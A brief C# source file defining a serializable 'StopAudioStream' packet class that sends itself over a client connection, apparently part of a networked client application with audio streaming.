using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets {

    [Serializable]
    public class StopAudioStream : IPacket {

        public StopAudioStream() {
            
        }

        public void Execute(Client client) {
            client.Send(this);
        }
    }
}
